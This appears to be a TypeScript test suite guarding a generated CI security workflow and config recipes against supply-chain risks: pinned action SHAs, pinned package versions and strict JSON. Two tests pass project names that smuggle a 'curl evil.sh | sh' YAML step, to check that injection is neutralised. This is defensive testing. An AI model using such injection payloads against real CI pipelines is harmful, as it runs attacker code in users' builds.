import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  securityWorkflowTemplate,
  CHECKOUT_SHA,
  SETUP_NODE_SHA,
  GITLEAKS_SHA,
} from '../src/generators/security-workflow.js';
import { APPLY_RECIPES } from '../src/core/recipes.js';

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..');
const pkgVersion = (
  JSON.parse(readFileSync(join(repoRoot, 'package.json'), 'utf8')) as { version: string }
).version;

/**
 * Supply-chain guards for the security workflow installed into USER projects.
 * The SHAs below were verified against their GitHub tags on 2026-08-16
 * (actions/checkout@v4.4.0, actions/setup-node@v4.4.0, gitleaks-action@v2.3.9).
 * If a bump moves the constant without updating this test — or vice versa —
 * fail loud and re-verify against the GitHub API before merging.
 */
describe('security-workflow template (supply chain)', () => {
  it('pins actions to the verified tag SHAs', () => {
    expect(CHECKOUT_SHA).toBe('11d5960a326750d5838078e36cf38b85af677262'); // v4.4.0
    expect(SETUP_NODE_SHA).toBe('49933ea5288caeca8642d1e84afbd3f7d6820020'); // v4.4.0
    expect(GITLEAKS_SHA).toBe('ff98106e4c7b2bc287b24eaf42907196329070c7'); // v2.3.9
  });

  it('pins the vibe-harness CLI to the generating version (no floating latest)', () => {
    const wf = securityWorkflowTemplate('my-app');
    expect(wf).toContain(`npx --yes @vibeharness/cli@${pkgVersion} audit --fail-under 70`);
    expect(wf).not.toContain('npx --yes @vibeharness/cli audit');
  });

  it('neutralises a malicious project name (no YAML injection via comment break)', () => {
    const wf = securityWorkflowTemplate('evil\n- name: pwned\n  run: curl evil.sh | sh');
    // The payload must stay trapped on the header comment line — no newline
    // may survive to break out of the `#` comment into YAML structure.
    const lines = wf.split('\n');
    expect(lines[0].startsWith('# Security gate for ')).toBe(true);
    expect(lines[0]).toContain('pwned'); // text preserved, structure destroyed
    expect(lines[1].startsWith('#')).toBe(true);
    // No payload line may appear as a YAML mapping anywhere.
    expect(wf).not.toContain('\n- name: pwned');
    expect(wf).not.toContain('\n  run: curl evil.sh');
  });

  it('neutralises lone-CR payloads (YAML treats \\r as a line break too)', () => {
    // v0.8.3 regression: a \r without \n survived the old /\r?\n/ flattening
    // and broke out of the header comment — silently disabling the whole gate.
    const wf = securityWorkflowTemplate('evil\r- run: curl evil.sh | sh');
    expect(wf).not.toContain('\r');
    const lines = wf.split('\n');
    expect(lines[0].startsWith('# Security gate for ')).toBe(true);
    expect(lines[1].startsWith('#')).toBe(true);
    expect(wf).not.toContain('\n- run: curl evil.sh');
  });

  it('keeps gitleaks + npm audit + audit gate jobs', () => {
    const wf = securityWorkflowTemplate('demo');
    expect(wf).toContain('gitleaks/gitleaks-action@');
    expect(wf).toContain('npm audit --audit-level=high');
    expect(wf).toContain('audit --fail-under 70');
  });
});

describe('generated .mcp.json recipe (supply chain)', () => {
  const recipe = APPLY_RECIPES['modelcontextprotocol/servers'];
  const mcpFile = recipe.files?.find((f) => f.path === '.mcp.json');

  it('is strict JSON (no // comments — clients with strict parsers must load it)', () => {
    expect(mcpFile).toBeDefined();
    expect(() => JSON.parse(mcpFile!.content)).not.toThrow();
    expect(mcpFile!.content).not.toContain('//');
  });

  it('pins every MCP server version and ships no dead packages', () => {
    const parsed = JSON.parse(mcpFile!.content) as {
      mcpServers: Record<string, { args: string[] }>;
    };
    const servers = Object.values(parsed.mcpServers);
    expect(servers.length).toBeGreaterThan(0);
    for (const server of servers) {
      const pkg = server.args.find((a) => a.startsWith('@modelcontextprotocol/'));
      expect(pkg).toBeDefined();
      expect(pkg).toMatch(/@\d/); // version-pinned, never floating latest
    }
    // server-fetch was removed from npm — shipping it is typosquat bait.
    expect(mcpFile!.content).not.toContain('server-fetch');
  });

  it('cursor starter is also strict JSON with pinned versions', () => {
    const cursor = recipe.files?.find((f) => f.path.includes('cursor-mcp.json'));
    expect(cursor).toBeDefined();
    expect(() => JSON.parse(cursor!.content)).not.toThrow();
  });
});

describe('generated starters fail loud on missing env (no ! assertions)', () => {
  it('drizzle config throws explicitly instead of using a non-null assertion', () => {
    const drizzle = APPLY_RECIPES['drizzle-team/drizzle-orm'];
    const config = drizzle.files?.find((f) => f.path === 'drizzle.config.ts');
    expect(config?.content).toContain("throw new Error('Missing DATABASE_URL");
    expect(config?.content).not.toContain('DATABASE_URL!');
  });

  it('stripe starter throws explicitly instead of using non-null assertions', () => {
    const stripe = APPLY_RECIPES['stripe/stripe-node'];
    const starter = stripe.files?.find((f) => f.path.includes('stripe-webhook'));
    expect(starter?.content).toContain("throw new Error('Missing STRIPE_SECRET_KEY");
    expect(starter?.content).not.toContain('STRIPE_SECRET_KEY!');
    expect(starter?.content).not.toContain('STRIPE_WEBHOOK_SECRET!');
  });

  it('playwright starter never turns an env var into a shell command', () => {
    const playwright = APPLY_RECIPES['microsoft/playwright'];
    const starter = playwright.files?.find((f) => f.path.includes('playwright.config'));
    expect(starter?.content).not.toContain('process.env.E2E_COMMAND');
  });
});
